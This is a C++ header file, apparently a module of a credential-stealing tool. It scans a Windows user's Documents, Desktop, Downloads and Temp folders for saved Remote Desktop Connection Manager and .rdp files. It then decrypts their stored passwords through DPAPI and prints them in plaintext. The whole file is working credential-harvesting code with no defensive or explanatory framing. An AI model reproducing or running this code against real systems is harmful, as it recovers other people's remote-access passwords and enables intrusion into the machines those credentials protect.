#ifndef RDP_DUMP_H
#define RDP_DUMP_H

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <regex>

#pragma comment(lib, "crypt32.lib")

namespace RdpDump {

    inline std::vector<BYTE> Base64Decode(const std::string& b64) {
        DWORD dwLen = 0;
        CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);
        std::vector<BYTE> out(dwLen);
        CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &dwLen, NULL, NULL);
        return out;
    }

    inline std::string DpapiDecrypt(const std::vector<BYTE>& enc) {
        DATA_BLOB in{ static_cast<DWORD>(enc.size()), const_cast<BYTE*>(enc.data()) };
        DATA_BLOB out{ 0, nullptr };
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
            std::string dec(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return dec;
        }
        return "";
    }

    inline void ParseRdcMan(const std::filesystem::path& path) {
        std::ifstream f(path);
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        std::regex re("<password>(.*?)</password>");
        auto begin = std::sregex_iterator(content.begin(), content.end(), re);
        auto end = std::sregex_iterator();
        for (auto it = begin; it != end; ++it) {
            std::string b64 = (*it)[1];
            auto enc = Base64Decode(b64);
            std::string dec = DpapiDecrypt(enc);
            if (!dec.empty())
                std::cout << "  [RDCMan] Password: " << dec << "\n";
        }
    }

    inline void ParseRdpFile(const std::filesystem::path& path) {
        std::ifstream f(path);
        std::string line;
        while (std::getline(f, line)) {
            if (line.find("password 51:b:") == 0) {
                std::string hex = line.substr(16);
                std::vector<BYTE> enc;
                for (size_t i = 0; i + 1 < hex.length(); i += 2) {
                    try {
                        enc.push_back(static_cast<BYTE>(
                            std::stoi(hex.substr(i, 2), nullptr, 16)));
                    } catch (...) { break; }
                }
                std::string dec = DpapiDecrypt(enc);
                if (!dec.empty())
                    std::cout << "  [RDP] Password: " << dec << "\n";
            }
        }
    }

    inline void Run() {
        std::cout << "\n=== RDP Credentials (RDCMan / mstsc) ===\n";

        const char* up = std::getenv("USERPROFILE");
        const char* la = std::getenv("LOCALAPPDATA");
        if (!up) return;

        std::vector<std::filesystem::path> dirs = {
            std::filesystem::path(up) / "Documents",
            std::filesystem::path(up) / "Desktop",
            std::filesystem::path(up) / "Downloads",
        };
        if (la) dirs.push_back(std::filesystem::path(la) / "Temp");

        for (auto& dir : dirs) {
            if (!std::filesystem::exists(dir)) continue;
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(dir)) {
                    if (!p.is_regular_file()) continue;
                    auto ext = p.path().extension().wstring();
                    if (ext == L".rdg") ParseRdcMan(p.path());
                    else if (ext == L".rdp") ParseRdpFile(p.path());
                }
            } catch (...) {}
        }
    }
}

#endif